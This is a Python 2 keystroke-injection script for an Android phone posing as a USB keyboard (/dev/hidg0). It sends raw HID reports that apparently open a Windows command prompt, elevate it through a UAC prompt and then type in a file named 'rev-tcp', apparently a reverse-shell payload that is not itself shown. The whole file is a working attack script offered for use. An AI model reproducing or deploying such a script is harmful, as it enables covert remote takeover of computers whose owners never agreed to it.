#!/usr/bin/python
import sys
sys.path.append("/sdcard/files/modules/")
import keyseed

# pop up cmd

print '''sleep 1'''
print '''echo -ne "\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''sleep 1'''
print '''echo -ne "\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''sleep 1'''

print '''echo -ne "\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''sleep 1'''

print '''echo -ne "\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''sleep 1'''

print '''echo -ne "\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''sleep 1'''

print '''echo -ne "\\x02\\x00\\x00\\x43\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''sleep 1'''

print '''echo -ne "\\x01\\x00\\x00\\x51\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''

print '''echo -ne "\\x01\\x00\\x00\\x51\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''

print '''echo -ne "\\x01\\x00\\x00\\x51\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''

print '''echo -ne "\\x01\\x00\\x00\\x51\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''

print '''sleep 2'''

print '''echo -ne "\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''

print '''sleep 2'''

print '''echo -ne "\\x04\\x00\\x00\\x1c\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''


print '''sleep 3'''

f = open("/sdcard/files/rev-tcp", "rb")
try:
    byte = f.read(1)
    while byte != "":
        byte = f.read(1)
	keyseed.findinlist(byte)

finally:
    f.close()


#Hit enter
print '''sleep 2'''

print '''echo -ne "\\x00\\x00\\x00\\x28\\x00\\x00\\x00\\x00" > /dev/hidg0'''
print '''echo -ne "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" > /dev/hidg0'''


